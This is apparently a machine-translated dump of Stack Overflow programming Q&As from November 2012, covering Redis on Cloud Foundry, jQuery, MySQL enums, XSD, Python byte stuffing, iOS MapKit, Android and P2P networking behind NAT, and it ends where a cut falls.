            CloudPoolConfiguration cloudPoolConfiguration = new CloudPoolConfiguration();
            cloudPoolConfiguration.setPoolSize("3-5");

            CloudRedisConnectionFactoryBean factory = new CloudRedisConnectionFactoryBean();
            factory.setCloudPoolConfiguration(cloudPoolConfiguration);
            factory.setServiceName("redis-slave");
            factory.afterPropertiesSet();

            RedisConnectionFactory redisSlaveConnectionFactory = initSlaveOnMaster(factory);

            return redisSlaveConnectionFactory;
        }

        private RedisConnectionFactory initSlaveOnMaster(
                CloudRedisConnectionFactoryBean factory) throws Exception {
            RedisConnectionFactory redisSlaveConnectionFactory = factory
                    .getObject();

            RedisServiceInfo serviceInfo = new CloudEnvironment()
                    .getServiceInfo("redis-master", RedisServiceInfo.class);

            Jedis jedis = (Jedis) redisSlaveConnectionFactory.getConnection()
                    .getNativeConnection();
            jedis.slaveof(serviceInfo.getHost(), serviceInfo.getPort());
            return redisSlaveConnectionFactory;
        }

        @Bean
        public RedisConnectionFactory redisCacheConnectionFactory()
                throws Exception {
            CloudPoolConfiguration cloudPoolConfiguration = new CloudPoolConfiguration();
            cloudPoolConfiguration.setPoolSize("3-5");

            CloudRedisConnectionFactoryBean factory = new CloudRedisConnectionFactoryBean();
            factory.setCloudPoolConfiguration(cloudPoolConfiguration);
            factory.setServiceName("redis-cache");
            factory.afterPropertiesSet();

            return factory.getObject();
        }
    }

    interface MasterSlaveConfig {

        RedisConnectionFactory redisMasterConnectionFactory() throws Exception;

        RedisConnectionFactory redisSlaveConnectionFactory() throws Exception;

        RedisConnectionFactory redisCacheConnectionFactory() throws Exception;
    }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:28:49.420

好的...检查代码后，我发现了这个：

redis.conf.erb 中的重命名命令 SLAVEOF "" (https://github.com/cloudfoundry/vcap-services/blob/master/redis/resources/redis.conf.erb)

所以 SLAVEOF 命令在 Cloudfoudry 上被禁用，所以：

*   监视器
*   BGSAVE
*   BGREWRITEAOF
*   奴隶
*   调试
*   同步

# javascript - 删除现有验证

> ID：13530072
> 
> 赞同：1
> 
> 时间：2012-11-23T13:25:47.247
> 
> 标签：javascript, jquery, asp.net-mvc-3

我想清理验证

```
packageDiv.find('[name$=Code]:input').each(function () { addFieldValidation($(this)); }); 
```

我正在使用它，但无法正常工作：

```
packageDiv.find('[name$=Code]:input').data('val','false'); 
```

你有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:35:09.190

我不是 JQuery 专家，但我认为您错误地调用了该函数。根据[http://api.jquery.com/jQuery.data/](http://api.jquery.com/jQuery.data/)，您需要指定元素、属性和值作为参数，而不仅仅是后两者。

您应该为此使用该`attr`功能： `packageDiv.find('[name$=Code]:input').attr('value','false');`

# jquery - 创建增量按钮，如果边距大于 2800 像素则关闭

> ID：13530079
> 
> 赞同：0
> 
> 时间：2012-11-23T13:26:03.843
> 
> 标签：jquery

我正在制作一个滑块，并试图弄清楚如何专门为按钮编程。

我希望它在点击时以 700 像素的增量向左移动，但是一旦 marginLeft 大于 2800 像素，它就不会在点击时做任何事情。

现在我有以增量移动容器的部分，但我不确定如何制作在“slider_container”之后它什么都不做的部分，marginLeft 大于 2800 像素。

```
$("#left").click(function () {
    $("#slider_container").animate ({
        marginLeft: "+=700px"
    },450 );
}); 
```

我想知道为什么以下不起作用：

```
if ($("#slider_container").css("marginLeft") >= 2800) {
      $("#right").click(function () {
    $("#slider_container").animate ({
        marginLeft: "-=0px"
    },450 );
});  
}
else
{
    $("#right").click(function () {
    $("#slider_container").animate ({
        marginLeft: "-=700px"
    },450 );
});  

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:29:25.827

尝试这个：

```
$("#left").click(function () {
    var margin = parseInt($("#slider_container").css("marginLeft")),
        move = Math.min(700, 2800 - margin);
    if (move > 0) {
        $("#slider_container").animate ({
            marginLeft: "+=" + move + "px"
        },450 );
    }
}); 
```

在您刚刚添加到问题的代码中，您需要将 click 事件放在`if`里面`function`。还有，`animate to "-=0px"`这有意义吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T15:02:06.427

好的，我得到了它的工作，这是我想出的解决方案：

```
$("#right").click(function () {

if (parseInt($("#slider_container").css("marginLeft")) < -2100) {
    $("#slider_container").animate ({
        marginLeft: -2800
    },450 ); 
}
else
{
    $("#slider_container").animate ({
        marginLeft: "-=700px"
    },450 ); 

}
});

$("#left").click(function () {

if (parseInt($("#slider_container").css("marginLeft")) > -699) {
    $("#slider_container").animate ({
        marginLeft: 0
    },450 ); 
}
else
{
    $("#slider_container").animate ({
        marginLeft: "+=700px"
    },450 ); 

}
}); 
```

# c# - MySQL 连接器附加枚举值比实际值小一

> ID：13530080
> 
> 赞同：3
> 
> 时间：2012-11-23T13:26:20.600
> 
> 标签：c#, .net, mysql, mysql-connector

我正在使用[MySQL Connector](http://dev.mysql.com/downloads/connector/net/) for .NET 从 C# 管理 MySQL 数据库。

当我尝试将枚举插入数据库时​​，它会将值附加到**比实际值小一**的枚举中。

```
public enum MyEnum {
    FirstValue, SecondValue, ThirdValue;
}

public void InsertEnum() {
    MySqlConnection con = new MySqlConnection(connStr);
    string sql = "INSERT INTO table (Col1) VALUES (@enumVal);";
    MySqlCommand cmd = new MySqlCommand(sql, con);
    cmd.Parameters.AddWithValue("@enumVal", MyEnum.SecondValue);
        //Note I'm trying to insert 'SecondValue' --^

    con.Open();
    cmd.ExecuteNonQuery();
    con.Close();
} 
```

这将插入`FirstValue`数据库。

数据库中的`Col1`列是 ENUM 数据类型：

```
ENUM('FirstValue','SecondValue','ThirdValue') 
```

如果我尝试追加`MyEnum.FirstValue`，我会得到一个数据截断错误（`data truncated for column COLUMN_NAME`），因为它尝试使用与 .NET 相同的索引（`0`在 的情况下`MyEnum.FirstValue`），这是[MySQL 枚举](http://dev.mysql.com/doc/refman/5.6/en/enum.html#enum-indexes)中的保留值（因为它们`1`默认启动）。

一种解决方案是附加`+1`到所有枚举值或可能进行扩展：

```
cmd.Parameters.AddWithValue("@enumVal", MyEnum.SecondValue + 1); 
```

我仍然觉得我必须手动将值修改为应该自动转换它的库。

我做错了什么，还是没有默认的方法来处理这个？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:38:02.907

你可以让你的枚举像这样

```
public enum MyEnum {
    FirstValue = 1, 
    SecondValue, 
    ThirdValue
} 
```

它将从 1 开始，而不是从 0 开始。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T13:38:18.820

.NET 枚举默认从零开始，并以整数为后盾（即，您可以将默认枚举强制转换为整数并返回）。

我想正在发生的事情是 MySQL 数据库驱动程序将枚举值转换为整数，并尝试插入它。

MySQL 将插入枚举列的整数视为从 1 开始的索引。

我建议只将数据库列设为整数而不是 MySQL 枚举。这样，零是一个有效值。

或者，您可以将枚举的第一个值声明为整数值 1，以匹配 MySQL，如下所示：

```
public enum MyEnum 
{
    FirstValue = 1, 
    SecondValue, 
    ThirdValue
} 
```

我认为我说得对，`SecondValue`然后`ThirdValue`将分别以值 2 和 3 支持。

然后，当连接器将枚举转换为整数时，它将返回 1、2 和 3，这将与 MySQL 的预期相匹配。

第三种选择是在两端保持类型不变，并且只是使这个映射成为你的数据层的一个函数（你确实有一个，对吗？） - 然后你只需要在一个地方处理这个问题。请注意，对于未来的开发人员可能会有点误导。

# apache - 我可以在服务器级别设置文档类型吗？

> ID：13530082
> 
> 赞同：0
> 
> 时间：2012-11-23T13:26:25.527
> 
> 标签：apache, doctype, internet-explorer-10

我的公司即将从 win7 迁移到 win8，我的任务是更新我们的应用程序以在 IE10 中工作。目前我们在 IE8 中运行它们。

问题是它们都没有声明文档类型，因此 IE8 默认以 IE5 模式呈现它们。好吧，IE10 的默认渲染模式已经改变，所以为了继续正确渲染它们，我需要在我们所有的页面中声明一个 doctype（这会很麻烦）或者找到一个全局的方法来做到这一点。

所以我的问题是有没有办法告诉我的服务器（Apache 2.2）将一个文档类型插入到我没有的页面中？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T19:33:01.453

您不能在服务器端设置 doctype，但可以在服务器端设置 X-UA-Compatible 标头。有关如何操作的详细信息，请参阅[http://blogs.msdn.com/b/hanuk/archive/2008/08/28/apache-httpd-configuration-for-ie7-standard-mode-rendering-in-ie8.aspx](http://blogs.msdn.com/b/hanuk/archive/2008/08/28/apache-httpd-configuration-for-ie7-standard-mode-rendering-in-ie8.aspx)那。

以下页面描述了它在 IE10 中的工作原理：http: [//msdn.microsoft.com/en-us/library/ie/hh920756 (v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/ie/hh920756(v=vs.85).aspx)

# jquery - 替换的链接未使用 ajax 调用

> ID：13530083
> 
> 赞同：2
> 
> 时间：2012-11-23T13:26:26.013
> 
> 标签：jquery, ajax

我正在为游戏添加喜欢和不喜欢的链接。最初喜欢是活动的，用户点击它会显示

```
 unlike link 
 1 like this game 
```

那没问题。但是当我们点击不同的链接时，它会重新加载页面。我不想重新加载页面

```
<div class="gameLikeStatus">
 <a href="likeit" id="likeitlink">Like</a>
</div>
<div class="totalLikes">
<span id="likesCount"><s:property value="likes"/></span> like this game<br>
</div>
<script>

$('a#likeitlink').bind('click',function(event){
    event.preventDefault();
    $('.gameLikeStatus').html('<a href="unlikeit" id="Unlikeitlink">Unlike</a>');
    $likesNo= $('#likesCount').html();
    $likesNo++;
    $('#likesCount').html(""+$likesNo);

}); 

$('a#Unlikeitlink').bind('click',function(event){
    event.preventDefault();
    $('.gameLikeStatus').html('<a href="likeit" id="likeitlink">Like</a>');
    $likesNo= $('#likesCount').html();
    $likesNo--;
    $('#likesCount').html(""+$likesNo);
}); 

</script> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T13:28:40.313

代替

```
$('a#Unlikeitlink').bind('click',function(event){ 
```

和

```
$('.gameLikeStatus').on('click', '#Unlikeitlink', function(event){ 
```

（另一个也一样）

当你正在执行`$('a#Unlikeitlink').bind`时，集合是空的，因为链接还不存在，所以这什么都不做。[on](http://api.jquery.com/on/)启用对尚不存在的对象的委托。由于您没有绑定回调，因此您没有阻止正常的链接行为，因此您的问题。

您还应该解析您的增量或减量的 html：

```
$('.gameLikeStatus').on('click', '#likeitlink', function(event){
    event.preventDefault();
    $('.gameLikeStatus').html('<a href="unlikeit" id="Unlikeitlink">Unlike</a>');
    $likesNo= parseInt($('#likesCount').html(), 10) || 0;
    $likesNo++;
    $('#likesCount').html(""+$likesNo);
}); 

$('.gameLikeStatus').on('click', '#Unlikeitlink', function(event){
    event.preventDefault();
    $('.gameLikeStatus').html('<a href="likeit" id="likeitlink">Like</a>');
    $likesNo= parseInt($('#likesCount').html(), 10) || 0;
    $likesNo--;
    $('#likesCount').html(""+$likesNo);
}); 
```

（您也可以更简单地将其保存在全局变量中，而不是每次都读取）

[示范](http://jsfiddle.net/XcXhj/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-30T00:21:34.680

也许您使用的是较旧的 jQuery 版本。在 1.7 之前的 jQuery 版本中，您必须添加与 1.7 不同的事件侦听器。使用 .live 而不是 .on。

例子：

```
$('.gameLikeStatus').live('click', function(event){
    // Your code here
}); 
```

# c# - 沿X方向旋转时如何使透视效果更大？

> ID：13530085
> 
> 赞同：0
> 
> 时间：2012-11-23T13:26:28.883
> 
> 标签：c#, wpf, silverlight, windows-8, winrt-xaml

我正在做 winrt 应用程序，我想沿 X 方向旋转图像，我使用***Planeprojection*的** *RotationX*属性做到了这一点。但我想要它更透视的方式，我的意思是它在旋转时应该看起来更大，这怎么可能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T11:54:51.570

你需要一个复合过渡，包括倾斜、比例变换

# xsd - 在其他架构中使用部分外部 XSD 架构

> ID：13530086
> 
> 赞同：0
> 
> 时间：2012-11-23T13:26:32.180
> 
> 标签：xsd

假设我有一些外部模式，它为 Web 服务定义了一种信封：

```
<ext:envelope>
  <ext:message>
    <!-- anything else -->
  </ext:message>
</ext:envelope> 
```

其中 ext 是一个外部命名空间
它定义`<ext:message>`为

```
<xs:any namespace="##any" processContents="lax" minOccurs="0"
            maxOccurs="unbounded" /> 
```

这是我的问题：如果我想为我的服务编写 WSDL 模式，它必须符合这个信封，我该如何编写定义如下内容的模式：

```
<ext:envelope>
  <ext:message>
    <my:myElement />
  </ext:message>
</ext:envelope> 
```

我应该以某种方式扩展 ext:message 声明吗？这种“延伸”到底有没有可能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T18:09:17.683

您必须考虑更多的限制。让我们首先假设 XSD 1.0 来说明这一点。在这种情况下，保持原始 XSD 和修改后的 XSD 之间分离的机制是使用**xsd:redefine**。这允许组合 XSD，保持原始源和您的更改之间的分离。

但前提是要有一个全局复杂类型声明或组，它定义了**ext:message**的内容模型。

xsd:redefine 允许您将通配符替换为您选择的内容模型。它需要是类型或组的**限制**。

从 XSD 规范的角度来看，重新定义将为您提供等效的 XSD。但是，从工具支持来看，如果听到任何支持 xsd:redefine 的 XSD 到代码绑定，我会感到惊讶。

如果在您的情况下，您使用或目标的工具与 xsd:redefine 一起使用，那么您就完成了。否则，您可以选择应用自动 XML 架构重构，无需 xsd:redefine 即可创建 XSD 文件。实际上，自动转换完成了您可以手动执行的操作，但它是持续维护的更好选择。结果 XSD（没有重新定义）实际上是相同的（因为它们代表 PSVI 模型）并且可以由不支持 xsd:redefine 的工具使用。

# python - Octet（字节）填充和解填充，即用两个或 vv 替换一个字节

> ID：13530087
> 
> 赞同：3
> 
> 时间：2012-11-23T13:26:34.457
> 
> 标签：python, list, bytearray, binary-data

我正在使用 socket.recv() 通过套接字（蓝牙）从设备接收二进制数据。

我考虑过在列表或字节数组中进行缓冲，直到接收到足够的数据以进行解码和操作。也就是说，直到我收到一个开始和一个停止标志（字节）。

但是，该设备正在应用“八位字节填充”。也就是说，以下两个字节的每次出现都应替换为单个字节，如下所示：

```
dic = { '\xFE\xDC' : '\xFC' , '\xFE\xDD' : '\xFD' , '\xFE\xDE' : '\xFE'} 
```

此外，在发送数据时，应采用相反的方法。例如，一个字节 0xFC -> 产生两个字节 0xFE、0xDC。

真正发生的是，当填充（发送数据）时，如果检测到 0xFC、0xFD、0xFE 之一，则在字节之前添加 0xFE，该字节本身就是 XORed 0x20。在 unstuffing（接收数据）时，0XFE 被丢弃，接下来的字节是 XORed 0x20。

说我对 Python 还很陌生，这是轻描淡写的。我昨天开始编码，有一个界面启动并运行。然而，这有点棘手。

我知道我可以将数据放入字符串并进行替换。但是要将二进制数据打包成一个字符串，替换然后解包和解码似乎效率有点低。

当我看到 0xFE 标志时，我还可以观察传入的数据并采取行动。最好的方法是填充/取消填充列表、字节数组或其他任何东西。

替换列表或字节数组中的单个字节似乎并不太难，但是用两个或相反的方式替换一个......？

非常感谢任何帮助。

（顺便说一下，这是 Python 2.7。）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-23T14:09:07.143

# Overview

You need to wrap a bytestream and escape specific values. Also, the other way around is required: unescape control-codes and get the raw payload. You are working with sockets. The socket-commands uses string-parameters. In python, every string is basically a wrapper around a `char*`-array.

# Naive approach

Its a string and we want to replace specific values with other ones. So what is the simplest way to achieve this?

```
def unstuff(self, s):
    return s.replace('\xFE\xDC', '\xFC').replace('\xFE\xDD', '\xFE').replace('\xFE\xDE', '\xFE')
def stuff(self, s):
    return s.replace('\xFC', '\xFE\xDC').replace('\xFD', '\xFE\xDD').replace('\xFE', '\xFE\xDE') 
```

Seems to be bad. With every replace-call, a new string-copy will be created.

# Iterator

A very pythonic approach is to define an iterator for this specific problem: define the iterator to transform the input-data into the desired output.

```
def unstuff(data):
    i = iter(data)
    dic = {'\xDC' : '\xFC', '\xDD' : '\xFD', '\xFE' : '\xDE'}
    while True:
        d = i.next()  # throws StopIteration on the end
        if d == '\xFE':
            d2 = i.next()
            if d2 in dic:
                yield dic[d2]
            else:
                yield '\xFE'
                yield d2
        else:
            yield d

def stuff(data):
    i = iter(data)
    dic = { '\xFC' : '\xDC', '\xFD' : '\xDD', '\xFE' : '\xDE' }
    while True: 
        d = i.next() # throws StopIteration on the end
        if d in dic:
            yield '\xFE'
            yield dic[d]
        else:
            yield d

def main():
    s = 'hello\xFE\xDCWorld'
    unstuffed = "".join(unstuff(s))
    stuffed = "".join(stuff(unstuffed))
    print s, unstuffed, stuffed

    # also possible
    for c in unstuff(s):
        print ord(c)

if __name__ == '__main__':
    main() 
```

`stuff()` and `unstuff()` need something iterable (list, string, ...) and return an [iterator-object](http://docs.python.org/2/library/stdtypes.html#iterator-types). If you want to `print` the result or pass it into `socket.send`, you need to convert it back to a string (as shown with `"".join()`). Every unexpected data is handled somehow: `0xFE 0x__` will be returned verbatim, if it does not match any pattern.

# RegExp

Another way would be to use [regular expressions](http://docs.python.org/2/library/re.html). Its a big topic and a source of trouble sometimes, but we can keep it simple:

```
import re

s = 'hello\xFE\xDCWorld' # our test-string

# read: FE DC or FE DD or FE DE
unstuff   = re.compile('\xFE\xDC|\xFE\xDD|\xFE\xDE')
# read: 
#  - use this pattern to match against the string
#  - replace what you have found (m.groups(0), whole match) with
#    char(ord(match[1])^0x20)
unstuffed = unstuff.sub(lambda m: chr(ord(m.group(0)[1])^0x20), s)

# same thing, other way around
stuff   = re.compile('\xFC|\xFD|\xFE')
stuffed = stuff.sub(lambda m: '\xFE' + chr(ord(m.group(0))^0x20), unstuffed)

print s, unstuffed, stuffed 
```

As said, you must create the new string somewhere to be able to use it with sockets. At least, this approach do not create unnecessary copies of the string like `s.replace(..).replace(..).replace(..)` would. You should keep the patterns `stuff`and `unstuff` somewhere around as building these objects is relatively expensive.

# native C-Function

If some things are going to slow in python, we might want to use cpython and implement it as oure C-code. Basically, I do a first run, count how many bytes I nerd, allocate a new string and do the second run. I'm not very used to python-c-extensions and so I do not want to share this code. It just seems to work, see the next chapter

# Comparison

One of the most important rules of optimization: compare! The basic setup for every test:

```
generate random binary data as a string
while less_than_a_second:
    unstuff(stuff(random_data))
    count += 1
return time_needed / count 
```

I know, the setup isn't optimal. But we should get some usable result:

[![Comparing 4 methods](../Images/ebbec94a46b43be9254fcefbbc54445c.png)](https://i.stack.imgur.com/oN2zq.png)

What do we see? Native is the fastest way to go, but only for very small strings. This is probably because of the python-interpreter: only one function-call is needed instead of three. But microseconds is fast enough the most of the times. After ~500 bytes, the timings are nearly the same with the naive approach. There must be some deep magic happening down there in the implementation. Iterators and RegExp are unacceptable compared to the effort.

To sum things up: use the naive approach. Its hard to get something better. Also: if you simply guess about timings, you will be almost always wrong.

# maven - 使用 Maven 站点和降价在代码范围内显示美元符号

> ID：13530089
> 
> 赞同：2
> 
> 时间：2012-11-23T13:26:41.927
> 
> 标签：maven, markdown, maven-site-plugin, doxia

我想在使用 maven-site-plugin 和 markdown (doxia-module-markdown) 生成的代码范围内显示一个美元符号。

在代码范围之外，我使用了数字代码`&#36;`并解决了问题。但是在一个代码跨度（4个空格）内，数字代码没有被解码，这实际上并不令人惊讶：

> 在代码块中，与号 (&) 和尖括号（< 和 >）会自动转换为 HTML 实体。

（来自[http://daringfireball.net/projects/markdown/syntax#code](http://daringfireball.net/projects/markdown/syntax#code)）

我还尝试将美元符号 ( `$$`) 加倍、转义 ( `\$`)、魅力 ( `<3$`)，但没有任何效果！

有人有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T08:10:28.960

您可以在代码块中使用原始美元符号。[在doxia 语法页面](http://daringfireball.net/projects/markdown/syntax)中甚至还有一个小例子：

> Blockquotes 可以包含其他 Markdown 元素，包括标题、列表和代码块：

```
> ## This is a header.  
>   
> 1\.   This is the first list item.  
> 2\.   This is the second list item.  
>   
> Here's some example code:  
>   
>     return shell_exec("echo $input | $markdown_script"); 
```

在上面的示例中，美元未转义。

# google-calendar-api - 如何在未登录的情况下在其他用户日历上添加事件

> ID：13530092
> 
> 赞同：1
> 
> 时间：2012-11-23T13:26:48.087
> 
> 标签：google-calendar-api

我在添加事件时被困在 Google Calendar API 上。

我想允许其他用户在没有登录的情况下在谷歌日历上添加事件。到目前为止没有找到任何成功。我可以为用户获取日历，但找不到适合我的问题的解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T14:03:02.607

你可能想看看这个：

[Google Calendar API：如何在没有 Google 密码的情况下创建/编辑/删除事件？](https://stackoverflow.com/questions/6282162/google-calendar-api-how-to-create-edit-delete-events-without-google-password)

这基本上是一种无需登录或询问用户凭据即可添加事件的方法。

# objective-c - MKMapView addAnnotation 不立即添加注释

> ID：13530102
> 
> 赞同：2
> 
> 时间：2012-11-23T13:27:28.677
> 
> 标签：objective-c, ios, mkmapview, mkannotation, mkannotationview

我有以下简单的代码：

```
self.departureAnnotation = [[UserAnnotation alloc] init];
self.departureAnnotation.coordinate = self.map.centerCoordinate;
[self.map addAnnotation:self.departureAnnotation];

[self.map selectAnnotation:self.departureAnnotation animated:YES]; 
```

这段代码应该做的（显然）是将注释添加到地图并立即选择它。

尽管如此，运行 iOS 5.1.1 的未越狱 iPhone 4S 上的这段代码没有选择注释（标注未显示），但这在 iOS 6 模拟器中完美运行。

为了解决这个问题，我做了以下操作，这基本上将引脚的选择延迟了 0.2 秒，这是我不喜欢的：

```
self.departureAnnotation = [[UserAnnotation alloc] init];
self.departureAnnotation.coordinate = self.map.centerCoordinate;
[self.map addAnnotation:self.departureAnnotation];

[NSTimer scheduledTimerWithTimeInterval:0.2 target:self selector:@selector(selectPin:) userInfo:self.departureAnnotation repeats:NO];

- (void)selectPin:(NSTimer *)timer
{
    [self.map selectAnnotation:timer.userInfo animated:YES];

} 
```

为什么会这样？

PS：另外，按照相同的模式，如果我检查`[self.map viewForAnnotation: self.departureAnnotation]`而不是选择引脚，则视图为零。在那些 0.2 秒的延迟之后，没关系。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:52:20.960

`MKMapView`可能需要完成运行循环周期才能为您提供注释视图/选择注释。如果是这样，请不要使用计时器，将您分派`selectAnnotation:animated:`到下一个运行循环周期...

```
dispatch_async( dispatch_get_main_queue(), ^{
  [self.map selectAnnotation:self.departureAnnotation animated:YES];
} ); 
```

...可能会有所帮助。

文档还指出您需要立即添加注释，因为`MKMapView`它决定了哪个注释在屏幕上/不在屏幕上，因此它会为它返回视图。

只是我的 0.02 美元...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T14:55:29.847

这可能是因为`CATransaction`（[文档](https://developer.apple.com/library/ios/#documentation/GraphicsImaging/Reference/CATransaction_class/Introduction/Introduction.html)）。`CATransaction`“收集”您在开始和提交状态之间对 CALayers 所做的所有更改。有时，可能由于不正确的编程技术，两种方法会发生“冲突”，通常是在它们是异步的时候。对我来说，它是使用按钮发生的，例如当您激活一个按钮并想同时停用其他按钮时。我想其他修复可能是在同一方法之后立即调用
`[self.map setNeedsDisplay];`或`[self.map addAnnotation:self.departureAnnotation];`使用这段代码：

```
id __weak weakSelf = (id)self; 
[CATransaction setCompletionBlock:^{[weakSelf.map selectAnnotation:weakSelf.departureAnnotation animated:YES];}]; 
```

# android - 鼠标在两个视图上移动，如何让它们都处理 `ACTION_MOVE` 事件

> ID：13530104
> 
> 赞同：3
> 
> 时间：2012-11-23T13:27:33.797
> 
> 标签：android, mouseevent

我有两个视图，较大的在底部，较小的在顶部。如下图所示：

![在此处输入图像描述](../Images/ba488d5196b79b062d3ebd8d1ed33838.png)

现在我在 view1（view2 之外）上按下鼠标，然后移动到 view2。我发现即使在移动过程中鼠标在 view2 内，view2 也不会得到`ACTION_MOVE`事件。只有 view1 可以得到它。

我想要的是：

> 当鼠标在 view1 内部和 view2 外部时，让 view1 处理`ACTION_MOVE`事件。如果鼠标移到 view2 中，则让 view2 处理该`ACTION_MOVE`事件。

怎么做？

PS：安卓版本是2.x

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:41:16.380

这是不可能的，但你可以做一些其他的事情：

获取鼠标和view2的坐标，如果鼠标在view2的范围内，试试你想要的。或者如果你愿意，你可以`view2.onTouch`直接调用方法，为V2创建一个touchlistener类，例如`V2TouchListener`：

```
View v2 = ... ;
final V2TouchListener v2t = new V2TouchListener();
v2.setOnTouchListener(v2t);
v1.setOnTouchListener(new OnTouchListener() {

    @Override
    public boolean onTouch(View v, MotionEvent event) {
        int action = event.getAction();
        switch (action & MotionEvent.ACTION_MASK) {
        case MotionEvent.ACTION_DOWN:
            // do something
            break;
        case MotionEvent.ACTION_MOVE:
            // do something
            //if mouse is in bounds of view2 do this:
            //for example view is between x= 20 and x = 50
            if((event.getX() < 50) &&(event.getX() > 20) )
            v2t.onTouch(v2, event);
            break;
        }

        return false;
    }
}); 
```

# java - Java：服务器/客户端 -> 客户端/客户端

> ID：13530106
> 
> 赞同：3
> 
> 时间：2012-11-23T13:27:42.057
> 
> 标签：java, sockets, networking, client, p2p

我想在一些计算机之间建立点对点连接，这样用户就可以在没有外部服务器的情况下聊天和交换文件。我的第一个想法如下：

我在服务器上创建了一个中央 ServerSocket，所有应用程序都可以连接到该服务器。此 ServerSocket 跟踪连接的套接字（客户端），并将新连接客户端的 IP 和端口提供给所有其他客户端。每个客户端创建一个所有客户端都可以连接到的新 ServerSocket。

![在此处输入图像描述](../Images/ea859ff8dd8139fcb4c5e48be82a24af.png)

换句话说：每个客户端都有一个 ServerSocket，所有其他客户端都连接到它。消息应通过图像中的蓝线传递。

我只遇到了一个小问题：如果我通过所有不同的 IP 地址测试它，它工作正常，但是当两个客户端具有相同的（外部）IP 地址时，它就不再工作了。有人知道一个聪明的解决方案吗？

谢谢！马克

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T13:58:59.193

当主机位于 NAT 路由器后面并想要打开一个应该可以从 NAT 的另一端访问的服务器端口时，必须将 NAT 路由器配置为将该端口上的所有传入连接转发到该主机。

显然，不能将 NAT 路由器配置为对侦听同一端口的两个不同主机执行此操作。它不知道哪个主机应该处理每个传入的连接。当 NAT 后面有两台服务器时，它们必须使用不同的端口，并且 NAT 路由器必须配置为将每个端口转发到每个服务器。

这是对等网络的一个已知问题。其结果是，两个客户端之间的直接连接只有在它们的至少一个 NAT 配置为端口转发并因此可以充当另一个服务器时才可能。

**解决方案：**

连接两个锁定在非转发 NAT 后面的客户端的解决方法是添加使用第三个客户端的能力，该客户端具有服务器能力，作为它们之间的中间人。

当两个客户端在同一个 NAT 后面时，它们可以通过中央服务器交换它们的 LAN IP，并使用它们相互连接。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T13:59:11.213

如果您尝试通过互联网使其工作，您应该查看[STUN](http://en.wikipedia.org/wiki/Session_Traversal_Utilities_for_NAT)。我不知道是否有任何“即用型”可用的库，但这篇文章应该可以帮助您入门。

# android - distanceTo() 方法返回 0.0km。为什么？

> ID：13530109
> 
> 赞同：0
> 
> 时间：2012-11-23T13:27:46.783
> 
> 标签：android, map, distance

我想通过distanceTo（）方法计算android中两个位置（GeoPoint）之间的距离，但是当我运行程序时，该方法返回0.0并且程序显示0.0KM。为什么？问题是什么？

```
public class MyLocation extends MapActivity {
    GeoPoint mylocation;
    @Override
    public void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
          setContentView(R.layout.location);
        text_location.setOnKeyListener(new OnKeyListener(){
  public boolean onKey(View view, int keyCode,KeyEvent event){
      if(keyCode==KeyEvent.KEYCODE_ENTER){
                // The map should shows a location that user writes in edittex.
    Geocoder geo=new Geocoder(getApplicationContext(),Locale.getDefault());
    List<Address> address;
    try {
      address = geo.getFromLocationName(text_location.getText().toString(),3);
      if(address.size()>0){
      searchLocation=new GeoPoint((int)(address.get(0).getLatitude()*1e6),(int)(address.get(0).getLongitude()*1e6));
       float distance=0;
       distance=Distance(searchLocation);
        OverlayItem overlayItem=new OverlayIte(searchLocation,textLocation,"Distance:"+distance+"km");
      itemizedOverlay.addOverlay(overlayItem);                  mapOverlays.add(itemizedOverlay);
                        //
}
} catch (IOException e) {
     // TODO Auto-generated catch block
     e.printStackTrace();
}   
        return true;
   }
   return false;
  }
 });
 }
   private void initMyLocation() {
    final MyLocationOverlay overlay = new MyLocationOverlay(this, map);
    overlay.enableMyLocation();
    overlay.enableCompass(); 
    //
    mylocation=overlay.getMyLocation();
    overlay.runOnFirstFix(new Runnable() {
        public void run() {
            controller.setZoom(13);
            controller.animateTo(overlay.getMyLocation());
        }
    });

}
    private float Distance(GeoPoint searchLoc){
    Location a=new Location("locA");
    Location b=new Location("locB");
    if(mylocation!=null){
        a.setLatitude(mylocation.getLatitudeE6()/1e6);
        a.setLongitude(mylocation.getLongitudeE6()/1e6);
        b.setLatitude(searchLoc.getLatitudeE6()/1e6);
        b.setLongitude(searchLoc.getLongitudeE6()/1e6);
    }
               if(a.getLatitude()!=0)
        Log.i("this", "is not zero");
    else
        Log.i("this", "is zero");

    float distance=a.distanceTo(b);
    return distance;
}   
 } 
```

我编辑帖子并添加初始化 myLocation 变量的 initMyLocation() 方法，并将日志添加到 Distance() 方法以检查 a 或 b 的值。

谢谢。干杯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T13:43:28.767

你可以这样试试吗

```
public double distance(float lata, float longa, float latb, float longb) {
    double d2r = Math.PI / 180;
    double dlong = (longa - longb) * d2r;
    double dlat = (lata - latb) * d2r;
    double a = Math.pow(Math.sin(dlat / 2.0), 2) + Math.cos(latb * d2r)
            * Math.cos(lata * d2r) * Math.pow(Math.sin(dlong / 2.0), 2);
    double c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
    double d = 6367 * c;
    return d;

} 
```

# java - Java模板：自动注册jsp/jspf

> ID：13530110
> 
